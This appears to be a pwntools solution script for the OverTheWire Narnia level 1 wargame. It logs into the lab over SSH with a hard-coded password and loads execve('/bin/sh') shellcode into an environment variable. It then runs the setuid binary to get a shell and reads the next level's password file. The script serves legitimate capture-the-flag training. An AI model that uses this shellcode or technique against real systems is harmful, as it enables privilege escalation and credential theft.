# The password from the previous level is: eaa6AjYMBB
# Since it just executes the values that eax is set to, I just need to
# execute the necessary shellcode to pop a shell
from pwn import *
import binascii

# Saving the shellcode
# Based on this file from shell-storm
# https://shell-storm.org/shellcode/files/shellcode-399.html
sc = b'6a315899cd8089c389c16a4658cd80b00b52686e2f7368682f2f626989e389d1cd80'
sc = binascii.unhexlify(sc)

# Setting EGG to the shellcode
export_cmd = bytes('export EGG='.encode()) + sc
# Connect to the narnia 1 lab
shell = ssh('narnia1', 'narnia.labs.overthewire.org', password='eaa6AjYMBB', port=2226)
sh = shell.run('sh')
print(export_cmd)
sh.sendline(export_cmd)
sh.sendline(b'cd /narnia')
sh.sendline(b'./narnia1')
print(sh.clean(timeout = 1))
sh.sendline(b'cat /etc/narnia_pass/narnia2')
passwd = sh.clean(timeout = 1).decode()[:-1].strip()
print(passwd)